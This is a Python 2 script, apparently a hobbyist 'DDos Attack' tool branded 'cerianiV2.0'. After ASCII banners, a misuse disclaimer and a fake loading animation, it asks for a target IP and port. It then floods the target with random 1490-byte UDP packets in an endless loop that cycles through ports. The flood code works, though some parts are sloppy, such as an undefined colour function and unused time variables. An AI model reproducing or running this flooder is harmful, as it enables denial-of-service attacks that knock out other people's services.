import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print color_red_white("I am not responsible for the misuse of this program")
print ".######  ######## ########  ####    ###    ##    ## #### "
print "##    ## ##       ##     ##  ##    ## ##   ###   ##  ##  "
print "##       ##       ##     ##  ##   ##   ##  ####  ##  ##  "
print "##       ######   ########   ##  ##     ## ## ## ##  ##  "
print "##       ##       ##   ##    ##  ######### ##  ####  ##  "
print "##    ## ##       ##    ##   ##  ##     ## ##   ###  ##  "
print ".######  ######## ##     ## #### ##     ## ##    ## #### "
print " ad888888b,       ,a888a,    "
print "d8*     *88     ,8P*' `*Y8,  "
print "         88    ,8P       Y8, "
print "        d8P    88         88 "
print "       a8P     88         88 "
print "     ,d8P      88         88 "
print "   ,d8P'       88         88 "
print " ,d8P'         `8b       d8' "
print "a88*        d8b `8ba, ,ad8'  "
print "88888888888 Y8P   *Y888P*    "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print "[###                 ]  "
time.sleep(1)
os.system("clear")
print "[#####               ]  "
time.sleep(1)
os.system("clear")
print "[############        ]  "
time.sleep(1)
os.system("clear")
print "[##############      ]  "
time.sleep(1)
print "[################    ]  "
time.sleep(1)
os.system("clear")
print "[#################   ]  "
time.sleep(1)
os.system("clear")
print "[##################  ]  "
time.sleep(1)
os.system("clear")
print "[################### ]  "
time.sleep(1)
os.system("clear")
print "[####################]  "
time.sleep(1)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
